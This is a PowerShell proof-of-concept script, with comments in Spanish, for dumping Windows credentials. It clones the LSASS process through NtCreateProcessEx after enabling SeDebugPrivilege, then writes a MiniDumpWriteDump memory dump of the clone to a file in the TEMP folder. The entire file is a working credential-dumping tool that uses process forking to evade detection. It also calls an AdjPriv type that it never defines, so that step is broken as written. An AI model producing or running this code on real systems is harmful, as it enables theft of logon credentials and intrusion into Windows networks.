# ========================================================
#     LSASS Forked Dump - PoC V 1.1 (Robusto)
#     Autor: Willian Oliveira
#     Traducido y adaptado por: sezio (sergiovks)
# ========================================================

Write-Host "`n===============================================" -ForegroundColor Cyan
Write-Host "         LSASS Forked Dump - PoC - V 1.1       " -ForegroundColor Cyan
Write-Host "         Autor: Willian Oliveira               " -ForegroundColor Cyan
Write-Host "         Traducido y adaptado: sezio (sergiovks)      " -ForegroundColor Cyan
Write-Host "===============================================" -ForegroundColor Cyan

# Cargar definición de API
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class LSASSForkDump {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtCreateProcessEx(
        out IntPtr processHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr parentProcess,
        bool inheritObjectTable,
        IntPtr sectionHandle,
        IntPtr debugPort,
        IntPtr exceptionPort,
        bool inJob
    );

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        int ProcessId,
        IntPtr hFile,
        int DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}
"@

Write-Host "[+] API cargada." -ForegroundColor Green

# Verificar si estamos en modo administrador
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')) {
    Write-Host "[!] Este script debe ejecutarse como Administrador." -ForegroundColor Red
    exit
}

# Verificar privilegio SeDebugPrivilege
$privilegeEnabled = [AdjPriv]::EnablePrivilege("SeDebugPrivilege")
if (-not $privilegeEnabled) {
    Write-Host "[!] No se pudo habilitar SeDebugPrivilege." -ForegroundColor Red
    exit
}
Write-Host "[+] SeDebugPrivilege habilitado." -ForegroundColor Green

# Obtener PID de lsass
try {
    $lsass = Get-Process -Name lsass -ErrorAction Stop
    Write-Host "[+] LSASS PID: $($lsass.Id)" -ForegroundColor Green
} catch {
    Write-Host "[!] No se pudo obtener el proceso LSASS." -ForegroundColor Red
    exit
}

# Intentar abrir LSASS solo para clonarlo
$PROCESS_CREATE_PROCESS = 0x0080
$handle = [LSASSForkDump]::OpenProcess($PROCESS_CREATE_PROCESS, $false, $lsass.Id)

if ($handle -eq [IntPtr]::Zero) {
    Write-Host "[!] Falló al abrir LSASS para clonarlo. ¿Está Credential Guard activo?" -ForegroundColor Red
    exit
} else {
    Write-Host "[+] Handle a LSASS obtenido para clonación." -ForegroundColor Green
}

# Clonar proceso
[IntPtr]$cloneHandle = [IntPtr]::Zero
$ntstatus = [LSASSForkDump]::NtCreateProcessEx([ref]$cloneHandle, 0x1FFFFF, [IntPtr]::Zero, $handle, $true, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $false)

if ($cloneHandle -eq [IntPtr]::Zero -or $ntstatus -ne 0) {
    Write-Host "[!] Error al clonar LSASS. NtStatus: 0x$("{0:X}" -f $ntstatus)" -ForegroundColor Red
    exit
} else {
    Write-Host "[+] LSASS clonado exitosamente." -ForegroundColor Green
}

# Crear volcado del proceso clonado
$dumpPath = "$env:TEMP\forked_lsass.dmp"
$fs = New-Object IO.FileStream($dumpPath, [IO.FileMode]::Create, [IO.FileAccess]::Write)
$success = [LSASSForkDump]::MiniDumpWriteDump($cloneHandle, 0, $fs.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$fs.Close()

if ($success) {
    Write-Host "[+] Volcado creado con éxito en: $dumpPath" -ForegroundColor Green
} else {
    Write-Host "[!] Fallo al crear el volcado del proceso clonado." -ForegroundColor Red
}
